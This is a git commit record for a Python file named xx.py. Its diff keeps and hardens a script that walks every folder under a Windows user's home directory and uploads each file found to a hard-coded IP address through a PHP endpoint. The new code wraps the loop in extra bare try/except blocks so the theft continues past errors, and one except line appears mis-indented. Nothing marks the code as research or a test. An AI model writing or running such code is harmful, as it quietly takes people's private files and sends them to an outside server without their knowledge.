f7a7f994a65962a49937051e8f08a1468d8846c8
somehat <118371804+somehat@users.noreply.github.com>
2022-11-28 12:43:22 -0300

    Update xx.py

--- xx.py
+++ xx.py
@@ -10,11 +10,14 @@ path = f'C:/Users/{user}/'
 for folder in listdir(f'C:/Users/{user}'):
     current = path + folder
     print(">>>>>", current)
-    for file in glob.glob(f'{current}/*.*'):
-        print(file)
-        try:
-            url = 'http://3.85.122.241/globo_file.php'
-            files = {'file': open(bytes(file, encoding='utf-8', errors='replace'), 'rb')}
-            r = requests.post(url, files=files)
-        except:
-            ...
+    try:
+        for file in glob.glob(f'{current}/*.*'):
+            try:
+                print(file)
+                url = 'http://3.85.122.241/globo_file.php'
+                files = {'file': open(bytes(file, encoding='utf-8', errors='replace'), 'rb')}
+                r = requests.post(url, files=files)
+            except:
+                ...
+   except:
+        ...
